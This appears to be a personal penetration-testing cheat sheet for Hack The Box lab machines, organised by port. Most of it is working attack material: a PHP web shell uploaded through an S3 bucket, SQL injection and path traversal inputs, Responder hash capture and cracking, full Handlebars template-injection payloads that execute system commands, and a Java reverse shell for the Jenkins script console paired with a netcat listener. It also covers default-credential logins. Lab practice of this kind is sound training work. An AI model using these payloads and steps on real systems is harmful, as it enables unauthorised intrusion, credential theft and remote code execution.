nmap -sV {ipaddress} -Pn
nmap -p- --min-rate=1000 -sV {ip}

PORT 21 - FTP
    running nmap with -sC will check to see if anon ftp login is allowed

    ftp {ipaddress}
        login with anonymous, anon123
        ls to list files.
        get flag.txt to download

PORT 22 - SSH
    if able to find credentials and login via SSH check the following
        Socket Statistics:  ss -tln     and     ss -tl
            checks which ports a listening locally
            in my example PORT 5432 was running PostgreSQL
                create a ssh tunnel from a port ex:1234 to the SQL 5432 port
                    ssh -L 1234:localhost:5432 {target_user}@{target_IP}
                verify using ss -tlpn
                    should see a localhost process using the port ex: 127.0.0.1:1234 
                back on the local system connect via psql using the following:
                    psql -U {target_user} -h localhost -p 1234
                navigate PSQL using \l to list databases \c to connect to one, \dt to dump contents and SELECT * FROM "name" to read.

PORT 23 - TELNET
    telnet {ipaddress}
        login via typical users (admin, administrator, root)
        use ls, cd to navigate. cat to show .txt files

PORT 80 - HTTP also check PORT 8080 below
    gobuster dir -w /usr/share/wordlists/dirb/common.txt -u {ipaddress} initiate dir busting attack using wordlist to find hidden directories
    login via basic user/pass (admin,admin) ect..

    gobuster dir -u http://{ipaddress}/ -w /usr/share/wordlist/dirbuster/directory-list-2.3-small.txt -x php,html
    dir busting attack looking for php and html pages as these are most common
        login.php can be brute forced or use credentials downloaded from ftp ect..

    gobuster vhost -w subdomains-top1million-5000.txt -u http://domain.htb --append-domain
        this can be used to find subdomains of sites, ie: s3.thetoppers.htb
        sites like this may need to be associated to their server ip using the following
            echo "10.129.227.248 s3.thetoppers.htb" | sudo tee -a /etc/hosts
        s3 subdomains are AWS related and could be interacted with using the awscli with the following:
            aws --endpoint=http://s3.domain.htb s3 ls
            aws --endpoint=http://s3.domain.htb s3 ls s3://thetoppers.htb
                if this shows a .php file we can create a php one liner and use aws to upload
                    echo '<?php system($_GET["cmd"]); ?>' > shell.php
                then upload with aws using the following: 
                aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
            going to the site http://thetoppers.htb/shell.php?cmd=ls we can see shell.php and the upload worked
            use burpsuite
                navigate to site and in proxy/webhistory send to repeater
                verify request by modifying line 1 GET /shell.php?cmd=ls    response should show shell.php listed
                inject cmd commands with this line using ls to navigate to find target  example: GET /shell.php?cmd=ls+../
                read files using cat command    example: GET /shell.php?cmd=cat+../flag.txt HTTP/1.1

    when a page has a login page can attempt SQL Injection using
        Username = admin#
        Password = abc123 or anything

    when a page includes a page=*.html page it could be vulnerable to Local File Inclusion (LFI) and have access to the system files
        following "page=" insert the following "../../../../../../../../windows/system32/drivers/etc/hosts"
        example: http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts

        since the page is vulnerable to Inclusion and on a windows machine we can utilize SMB and capture the NetNTLMv2 when it attempts to auth.
            run Responder "sudo python3 Responder.py -I tun0" once running,
            send the page a request, example: "http://unika.htb/?page=//10.10.14.25/somefile" the 10.10 ip will be listed in Responer as "Responder IP" make sure that is updated
            the Responder server should receive a encrypted responce from the webpage, save the responce to a hash.txt file "echo "responder responce" > hash.txt"
            pass the hash to "john" and crack the password "john -w=/usr/share/wordlists/rockyou.txt hash.txt"
            use Evil-WinRM to connect "evil-winrm -i {ipaddress} -u administrator -p badminton"
            navigate using powershell commands. get-content to read txt files
    
    Node.js Server-side template injection (SSTI)
        test for the vulnerability by inputting ${7*7} and/or {{7*7}} into the submission form
            if the site responds with a parse error page it means it was detected as valid by the template engine, however the code had
            some error and was unable to be executed. we can find from this the template engine being used. ex: Handlebars
        The HackTricks website contains payloads for these template engines, for Node.js (Handlebars) use the following:
            {{#with "s" as |string|}}
                {{#with "e"}}
                    {{#with split as |conslist|}}
                        {{this.pop}}
                        {{this.push (lookup string.sub "constructor")}}
                        {{this.pop}}
                        {{#with string.split as |codelist|}}
                            {{this.pop}}
                            {{this.push "return process;"}}
                            {{this.pop}}
                            {{#each conslist}}
                                {{#with (string.sub.apply 0 codelist)}}
                                    {{this}}
                                {{/with}}
                            {{/each}}
                        {{/with}}
                    {{/with}}
                {{/with}}
            {{/with}}

            or

            {{#with "s" as |string|}}
                {{#with "e"}}
                    {{#with split as |conslist|}}
                        {{this.pop}}
                        {{this.push (lookup string.sub "constructor")}}
                        {{this.pop}}
                        {{#with string.split as |codelist|}}
                            {{this.pop}}
                            {{this.push "return process.mainModule;"}}
                            {{this.pop}}
                            {{#each conslist}}
                                {{#with (string.sub.apply 0 codelist)}}
                                    {{this}}
                                {{/with}}
                            {{/each}}
                        {{/with}}
                    {{/with}}
                {{/with}}
            {{/with}}

        using the burpsuite browser input the above payload into the submission form, intercept with burp and the payload should
        look like the following %257b%257b%2523%2577%256... copy that into the burp decoder and encode as URL. Paste that into
        the burp repeater and send to the site. if get a ReferenceError: require is not defined try other payloads to get [object process] 
        has been included

        note: in burp ctrl+shift+U decodes URL in the repeater tool. you can input URL code and use the shortcut then send it.

        once a payload is working send inputs to the server using the working format in inputing commands into the mainModule section:

            {{#with "s" as |string|}}
                {{#with "e"}}
                    {{#with split as |conslist|}}
                        {{this.pop}}
                        {{this.push (lookup string.sub "constructor")}}
                        {{this.pop}}
                        {{#with string.split as |codelist|}}
                            {{this.pop}}
                            {{this.push "return process.mainModule.require('child_process').execSync('whoami/ls/cd/cat/etc...');"}}
                            {{this.pop}}
                            {{#each conslist}}
                                {{#with (string.sub.apply 0 codelist)}}
                                    {{this}}
                                {{/with}}
                            {{/each}}
                        {{/with}}
                    {{/with}}
                {{/with}}
            {{/with}}


PORT 445 - SMB
    smbclient - L {ipaddress} -U Administrator to list shares, try leaving password blank or default easy passwords
    smbclient \\\\{ip}\\{share} to attempt to connect; this has worked well in the past, better than psexec.py
        once connected to share use ls,cd,get to nav and download

    if only access to one share and not the others use Impacket:
        run psexec.py administrator@{targetIP}
            password will be the same as used for smbclient, none or whatever
            navigation with dir, cd. issues reading or getting files.
            smbclient \\\\ip\\share seems to work better

PORT 873 - RSYNC
    rsync --list-only {target_IP}:: use this to interact with remote and list shares
        include shares in initial command to navigate. ie..  rsync --list-only {target_IP}::public
        to download file remove list-only from command and add file name and list desitation file name. ie.. rsync {target_IP}::public/flag.txt flag.txt

PORT 3306 - MYSQL
    mysql -h {ipaddress} -u root ## attempt to connect to host as root
        show databases; lists all databases
        use {database name}; selects database
        show tables; lists tables in database
        select * from {table}; lists contents of table

PORT 3389 - RDP
    xfreerdp /v:{ipaddress} /cert:ignore /u:Administrator to attempt to connect to rdp host ignoring certs and logging in as admin
        use blank password or usuals


PORT 6379 - REDIS
    redis-cli -h {ipaddress}

        in #Keyspace db0: has keys=4. that is the data
        "select 0" to select db0
        "keys *" to list the keys
        "get {key name}" to show the key

PORT 8080 - http
    check targetIP:8080 in browser
    
    running Jenkins
        try default user/pass: admin/password, root/password
            targetip:8080/script and input the following to create reverse shell but do not run yet:

                String host="{your_IP}";
                int port=8000;
                String cmd="/bin/bash";
                Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port); InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream(); OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()) {while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); 

            start netcat port 8000 on host system to listen for reverse shell:
                nc -lvnp 8000
            run jenkins script
            reverse shell should connect, run whoami and responce should be root, cd to /root directory and use ls,cat,cd

PORT 27017 - MONGODB
    ./mongo mongodb://{target_IP}:27017 run in folder with mongodb/bin to attempt to connect to db
        show dbs; - to show databases
        use {database name}; to select DB
        show collections; - to list info in DB
        db.flag.find().pretty(); to dump the contents of th DM


OTHER:
    echo "{ipaddress} {domain}" | sudo tee -a /etc/hosts    example: echo "10.129.128.223 unika.htb" | sudo tee -a /etc/hosts
        resolve a hostname into an IP address 